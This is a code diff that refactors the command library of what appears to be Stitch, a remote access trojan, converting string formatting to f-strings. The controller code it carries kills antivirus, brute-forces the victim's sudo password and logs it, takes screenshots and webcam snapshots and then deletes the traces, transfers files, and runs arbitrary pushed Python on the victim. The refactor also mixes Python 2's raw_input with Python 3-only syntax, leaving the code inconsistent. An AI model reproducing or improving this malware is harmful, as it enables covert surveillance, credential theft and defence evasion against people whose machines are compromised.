@@ -12,10 +12,7 @@ def st_recvall(client, count, aes_enc=None, encryption=True):
         if not newbuf: return None
         buf += newbuf
         count -= len(newbuf)
-    if not encryption:
-        return buf
-    else:
-        return decrypt(buf, aes_enc)
+    return decrypt(buf, aes_enc) if encryption else buf
 
 def st_receive(client,aes_enc):
     full_response = ""
@@ -67,7 +64,7 @@ class stitch_commands_library:
         self.cfgfile = open(hist_ini,'wb')
         if self.cli_target not in self.Config.sections():
             self.Config.add_section(self.cli_target)
-            st_log.info('Connected to {} for the very first time'.format(self.cli_target))
+            st_log.info(f'Connected to {self.cli_target} for the very first time')
         self.Config.set(self.cli_target,'port',self.cli_port)
         self.Config.set(self.cli_target,'user', self.cli_user)
         self.Config.set(self.cli_target,'os',self.cli_platform)
@@ -84,7 +81,7 @@ class stitch_commands_library:
                 self.receive()
             except Exception as e:
                 st_print("[!] Connection has been lost.")
-                st_log.error('Exception:\n{}'.format(str(e)))
+                st_log.error(f'Exception:\n{str(e)}')
                 return False
         return True
 
@@ -100,11 +97,11 @@ class stitch_commands_library:
         st_print("=== Antivirus Scan ===")
         if windows_client(system=self.cli_os):
             self.pyexec('avscan_win.py',pylib=True)
-            st_print("    {}".format(self.receive()))
-            st_print("    {}".format(self.receive()))
+            st_print(f"    {self.receive()}")
         else:
             self.pyexec('avscan_posix.py',pylib=True)
-            st_print("    {}".format(self.receive()))
+
+        st_print(f"    {self.receive()}")
 
     def avkill(self):
         self.pyexec('avkiller.py',pylib=True)
@@ -142,7 +139,7 @@ class stitch_commands_library:
 
     def clear(self):
         clear_screen()
-        st_print('[+] Current Session: {}\n\n'.format(self.cli_target))
+        st_print(f'[+] Current Session: {self.cli_target}\n\n')
 
     def crackpassword(self):
         with open(os.path.join(tools_path, 'passwords.txt'),'r') as pw:
@@ -160,9 +157,9 @@ class stitch_commands_library:
                 self.send(n)
                 resp = self.receive()
                 if 'password_failed' in resp:
-                    st_print('[-] {}'.format(n))
+                    st_print(f'[-] {n}')
                 if 'password_cracked' in resp:
-                    st_print('[+] Password: {}'.format(n))
+                    st_print(f'[+] Password: {n}')
                     st_logger(n,self.cli_dwld,'sudo_password')
                     cracked = True
                     break
@@ -189,25 +186,21 @@ class stitch_commands_library:
         if not os.path.exists(self.cli_dwld):
             os.mkdir(self.cli_dwld)
         if len(dwld) > 0:
-            st_print('[*] Beginning download of {}...'.format(f_name))
+            st_print(f'[*] Beginning download of {f_name}...')
             if f_name.endswith('\\') or f_name.endswith('/'):
                 d_file = f_name[:-1]
-                d_file = os.path.basename(d_file)
-                if not d_file:
-                    d_file = f_name[:-1]
+                d_file = os.path.basename(d_file) or f_name[:-1]
             else:
-                d_file = os.path.basename(f_name)
-                if not d_file:
-                    d_file = f_name
+                d_file = os.path.basename(f_name) or f_name
             d_file = d_file.replace('\\','').replace('/','')
             if '.' in d_file and not d_file.startswith('.'):
                 extension = d_file.index('.')
                 d_file = d_file[:extension]
-            d_zip = "{}-{}.zip".format(self.cli_user,d_file)
+            d_zip = f"{self.cli_user}-{d_file}.zip"
             downld = os.path.join(self.cli_dwld,d_zip)
             i = 1
             while os.path.exists(downld):
-                d_zip = "{}-{} ({}).zip".format(self.cli_user,d_file,i)
+                d_zip = f"{self.cli_user}-{d_file} ({i}).zip"
                 downld = os.path.join(self.cli_dwld,d_zip)
                 i += 1
             self.send(f_name)
@@ -230,7 +223,7 @@ class stitch_commands_library:
                                 download_bar.complete()
                     st_print("[+] Download succesful: %s\n" % downld)
                 else:
-                    st_print('[!] Size of "{}" is not a valid int'.format(size))
+                    st_print(f'[!] Size of "{size}" is not a valid int')
             else:
                 st_print(size)
         else:
@@ -375,9 +368,9 @@ class stitch_commands_library:
 
     def ifconfig(self, args):
         if windows_client(system=self.cli_os):
-            cmd = 'ipconfig {}'.format(args)
+            cmd = f'ipconfig {args}'
         else:
-            cmd = 'ifconfig {}'.format(args)
+            cmd = f'ifconfig {args}'
         self.send(cmd)
         st_print(self.receive())
 
@@ -414,19 +407,19 @@ class stitch_commands_library:
 
     def ls(self, args):
         if windows_client(system=self.cli_os):
-            cmd = 'dir /a {}'.format(args)
+            cmd = f'dir /a {args}'
         else:
-            cmd = 'ls -alh {}'.format(args)
+            cmd = f'ls -alh {args}'
         self.send(cmd)
         st_print(self.receive())
 
     def lsmod(self, args):
         if windows_client(system=self.cli_os):
-            cmd = 'driverquery {}'.format(args)
+            cmd = f'driverquery {args}'
         elif linux_client(system=self.cli_os):
-            cmd = 'lsmod {}'.format(args)
+            cmd = f'lsmod {args}'
         elif osx_client(system=self.cli_os):
-            cmd = 'kextstat {}'.format(args)
+            cmd = f'kextstat {args}'
         self.send(cmd)
         st_print(self.receive())
 
@@ -459,14 +452,13 @@ class stitch_commands_library:
 
     def ps(self,args):
         if windows_client(system=self.cli_os):
-            cmd = 'tasklist {}'.format(args)
+            cmd = f'tasklist {args}'
         else:
-            cmd = 'ps {}'.format(args)
+            cmd = f'ps {args}'
         self.send(cmd)
         st_print(self.receive())
 
     def pyexec(self, f_name, pylib=False):
-        code = ''
         cur_dir = os.getcwd()
         py_file = f_name.strip()
         if py_file != '':
@@ -480,15 +472,16 @@ class stitch_commands_library:
                 if not py_file.endswith('.py') or os.path.isdir(py_file_path):
                     st_print("[!] Only Python scripts located in %s can use pyexec.\n" %(dir_path))
                     return
+                code = ''
                 with open(py_file_path,'rb') as c:
-                    for line in c.readlines():
+                    for line in c:
                         code += line
                 if pylib:
-                    if not f_name == 'get_path.py':
-                        st_log.info('Sending {} code from {}'.format(self.cli_target, f_name))
-                    self.send('pylib'+ code)
+                    if f_name != 'get_path.py':
+                        st_log.info(f'Sending {self.cli_target} code from {f_name}')
+                    self.send(f'pylib{code}')
                 else:
-                    self.send('pyexec'+ code)
+                    self.send(f'pyexec{code}')
                     st_print(self.receive())
             else:
                 st_print('[!] %s is not located in %s.\n' % (py_file,dir_path))
@@ -500,10 +493,7 @@ class stitch_commands_library:
         st_print(self.receive())
         sc = os.path.join(self.cli_temp,'fs.jpg')
         self.download(sc)
-        if windows_client(system=self.cli_os):
-            cmd = 'del {}'.format(sc)
-        else:
-            cmd = 'rm -f {}'.format(sc)
+        cmd = f'del {sc}' if windows_client(system=self.cli_os) else f'rm -f {sc}'
         self.send(cmd)
         self.receive()
 
@@ -514,9 +504,9 @@ class stitch_commands_library:
 
     def touch(self, f_name):
         if windows_client(system=self.cli_os):
-            cmd = 'if not exist {} type NUL > {}'.format(f_name,f_name)
+            cmd = f'if not exist {f_name} type NUL > {f_name}'
         else:
-            cmd = 'touch {}'.format(f_name)
+            cmd = f'touch {f_name}'
         self.send(cmd)
         st_print(self.receive())
 
@@ -535,9 +525,9 @@ class stitch_commands_library:
         if '.' in u_file and not u_file.startswith('.'):
             extension = u_file.index('.')
             u_base = u_file[:extension]
-            u_zip = "{}.zip".format(u_base)
+            u_zip = f"{u_base}.zip"
         else:
-            u_zip = "{}.zip".format(u_file)
+            u_zip = f"{u_file}.zip"
         self.send(u_zip)
         content = ''
         cur_dir = os.getcwd()
@@ -549,28 +539,25 @@ class stitch_commands_library:
                 if os.path.isdir(u_file):
                     zipf = zipfile.ZipFile(u_zip_path, 'w', zipfile.ZIP_DEFLATED)
                     zipdir(u_file,zipf)
-                    zipf.close()
                 else:
                     zipf = zipfile.ZipFile(u_zip_path, 'w', zipfile.ZIP_DEFLATED)
                     zipf.write(u_file)
-                    zipf.close()
-                st_print("[*] Beginning upload of {}...".format(u_file))
+                zipf.close()
+                st_print(f"[*] Beginning upload of {u_file}...")
                 size =os.stat(u_zip_path)
                 size = size.st_size
                 upload_bar = progress_bar(size)
                 upload_bar.file_info()
                 with open (u_zip_path, 'rb') as upload:
-                    line = upload.read(1024)
-                    while line:
+                    while line := upload.read(1024):
                         self.send(line)
                         upload_bar.increment()
-                        line = upload.read(1024)
                 upload_bar.complete()
                 self.send('upload complete')
                 os.remove(u_zip_path)
                 st_print(self.receive())
             else:
-                st_print('[!] {} is not located in {}.\n'.format(u_file,uploads_path))
+                st_print(f'[!] {u_file} is not located in {uploads_path}.\n')
                 self.send("ERROR")
 
     def vmscan(self):
@@ -581,11 +568,10 @@ class stitch_commands_library:
         self.pyexec('webcamSnap.py',pylib=True)
         if cam_dev:
             self.send(cam_dev)
+        elif windows_client(system=self.cli_os):
+            self.send("0")
         else:
-            if windows_client(system=self.cli_os):
-                self.send("0")
-            else:
-                self.send('st_continue')
+            self.send('st_continue')
         if not windows_client(system=self.cli_os):
             upload_imgsnap = self.receive()
             if upload_imgsnap == 'upload_imgsnap':
@@ -597,10 +583,7 @@ class stitch_commands_library:
             st_print(resp)
             sc = os.path.join(self.cli_temp,'wb.jpg')
             self.download(sc)
-            if windows_client(system=self.cli_os):
-                cmd = 'del {}'.format(sc)
-            else:
-                cmd = 'rm -f {}'.format(sc)
+            cmd = f'del {sc}' if windows_client(system=self.cli_os) else f'rm -f {sc}'
             self.send(cmd)
             self.receive()
         else:
@@ -609,19 +592,15 @@ class stitch_commands_library:
     def webcamlist(self):
         self.pyexec('webcamList.py',pylib=True)
         resp = self.receive()
-        if windows_client(system=self.cli_os):
-            st_print(resp)
-            if no_error(resp):
-                st_print(self.receive())
-        else:
+        if not windows_client(system=self.cli_os):
             if resp == 'upload_imgsnap':
                 shutil.copy(imagesnap,os.path.join(uploads_path,'.st_imsnp'))
                 self.upload('.st_imsnp', to_cwd=False)
                 os.remove(os.path.join(uploads_path,'.st_imsnp'))
             resp = self.receive()
-            st_print(resp)
-            if no_error(resp):
-                st_print(self.receive())
+        st_print(resp)
+        if no_error(resp):
+            st_print(self.receive())
 
 ################################################################################
 #                        Start of DISCONNECT Section                           #
@@ -629,7 +608,7 @@ class stitch_commands_library:
 
     def exit(self, alive=True):
         if alive: self.send("end_connection")
-        st_print("[-] Disconnected from {}\n".format(self.cli_target))
+        st_print(f"[-] Disconnected from {self.cli_target}\n")
         self.client.close()
         return True
 
@@ -824,7 +803,8 @@ class stitch_commands_library:
 
     def logintext(self):
         text = raw_input("Enter text to be displayed on login window: ")
-        cmd = "defaults write /Library/Preferences/com.apple.loginwindow LoginwindowText \"{}\"".format(text)
+        cmd = f'defaults write /Library/Preferences/com.apple.loginwindow LoginwindowText \"{text}\"'
+
         self.send(cmd)
         st_print(self.receive())
 
